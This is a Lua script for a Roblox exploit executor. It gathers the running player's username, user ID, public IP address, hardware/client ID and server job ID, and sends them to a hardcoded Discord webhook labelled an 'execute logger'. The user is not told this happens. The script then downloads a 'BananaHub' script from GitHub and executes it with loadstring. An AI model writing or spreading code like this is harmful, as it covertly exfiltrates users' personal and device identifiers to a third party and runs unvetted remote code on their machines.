repeat wait() until game:IsLoaded() and game.Players.LocalPlayer

-- Function to post a webhook
function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn and syn.request
    if request then
        local data =
            request(
            {
                Url = Url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode(message)
            }
        )
        return ""
    else
        warn("HTTP request function not found!")
        return nil
    end
end

-- Function to create the admin logger message
function AdminLoggerMsg()
    local ip_address = "N/A"
    pcall(function()
        ip_address = tostring(game:HttpGet("https://api.ipify.org", true))
    end)
    
    local AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**User Execute Logger**",
                ["description"] ="",
                ["type"] = "rich",
                ["color"] = tonumber(0xf93dff),
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**UserID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**PlaceID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. ip_address .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Hwid**",
                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**JobID**",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Join Code**",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    }
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1243261637855547392/QS7xI01byrr5hNmTdHct7bYAzLIjLghc-Aed_31_pjbqx7CgKzytgXyaik-wwANvWH3p", AdminLoggerMsg())

if not getgenv().Nexus then 
   
end

if not getgenv().NewBanana then 
    repeat wait() until game:IsLoaded()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaHub.lua"))()
end
